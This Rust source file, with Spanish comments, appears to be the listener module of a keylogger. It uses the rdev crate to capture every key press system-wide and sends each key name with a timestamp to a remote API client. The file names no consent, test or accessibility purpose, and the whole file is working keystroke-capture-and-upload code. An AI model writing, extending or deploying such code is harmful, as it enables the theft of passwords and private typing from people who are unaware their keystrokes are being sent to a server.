use rdev::{listen, Event, EventType};
use crate::api::ApiClient;
use std::sync::Arc;

pub fn start(api_client: Arc<ApiClient>) -> Result<(), Box<dyn std::error::Error>> {
    println!("⌨️  Listener iniciado. Capturando teclas...");

    let callback = move |event: Event| {
        if let EventType::KeyPress(_) = event.event_type {
            if let Some(key) = event.name {
                let timestamp = chrono::Local::now().to_rfc3339();
                if let Err(e) = api_client.send_key(&key, &timestamp) {
                    eprintln!("⚠️ Error enviando tecla '{}': {}", key, e);
                }
            }
        }
    };

    // ✅ CORREGIDO: Usar {:?} en lugar de {}
    if let Err(error) = listen(callback) {
        eprintln!("❌ Error crítico en el listener: {:?}", error);
        return Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("Error en listener: {:?}", error)  // <--- {:?} aquí también
        )));
    }

    Ok(())
}
